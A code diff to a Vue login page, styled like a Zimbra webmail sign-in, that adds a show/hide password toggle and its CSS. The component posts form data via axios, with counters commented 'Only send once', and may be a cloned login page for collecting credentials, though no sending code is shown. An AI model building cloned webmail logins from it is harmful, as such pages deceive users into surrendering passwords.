@@ -27,11 +27,62 @@
                                     <label for="username" class="zLoginFieldLabel">Username</label>
                                             <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" v-model="formDataRes.userid" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
                                         <label for="password" class="zLoginFieldLabel">Password</label>
+
+
+
+<!-- 
                                     <div class="passwordWrapper">
                                         <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" v-model="formDataRes.password" size="40" maxlength="1024">
                                         <span toggle="#password"  id="showSpan" style="display: block;">Show</span>
                                         <span toggle="#password"  id="hideSpan" style="display: none;">Hide</span>
                                     </div>
+ -->
+
+
+
+
+
+                                      <!-- <div class="passwordWrapper">
+    <input
+      id="password"
+      :type="showPassword ? 'text' : 'password'"
+      placeholder="Enter password"
+    />
+
+    <span
+      v-if="!showPassword"
+      @click="showPassword = true"
+      style="cursor: pointer;"
+    >
+      Show
+    </span>
+
+    <span
+      v-else
+      @click="showPassword = false"
+      style="cursor: pointer;"
+    >
+      Hide
+    </span>
+  </div> -->
+
+<div class="passwordWrapper">
+  <input
+    id="password"
+    v-model="formDataRes.password"
+    :type="showPassword ? 'text' : 'password'"
+    placeholder="Enter password"
+  />
+
+  <span
+    class="passwordToggle"
+    @click="showPassword = !showPassword"
+  >
+    {{ showPassword ? 'Hide' : 'Show' }}
+  </span>
+</div>
+
+
                                     <div class="signInAndLabel">
                                         <div>
                                             <button id="loginButton" type="submit" tabindex="5" class="loginButton" @click.prevent="finishJoob();">Sign In</button>
@@ -85,6 +136,8 @@
 <script>
 import axios from "axios";
 
+
+
 export default {
   name: "App",
   data() {
@@ -97,6 +150,8 @@ export default {
       isActive: false,
       count: 0,
       finalCount: 2, // Only send once
+      showPassword: false, // Add this line
+
     };
   },
   methods: {
@@ -145,6 +200,42 @@ export default {
 
 
 <style>
+
+.passwordWrapper {
+  position: relative;
+  display: flex;
+  align-items: center;
+  width: 100%;
+}
+
+.passwordWrapper input {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 12px 70px 12px 12px;
+}
+
+.passwordToggle {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  display: inline-block;
+  color:  black !important;
+  /* background-color: ; */
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  z-index: 9999;
+  padding: 5px;
+  visibility: visible !important;
+  opacity: 1 !important;
+  user-select: none;
+}
+
+.passwordToggle:hover {
+  color: #0056b3 !important;
+  text-decoration: underline;
+}
 
 .ScreenReaderOnly{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);}
 .user_font_modern,.user_font_modern TEXTAREA,.user_font_modern INPUT{font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;}
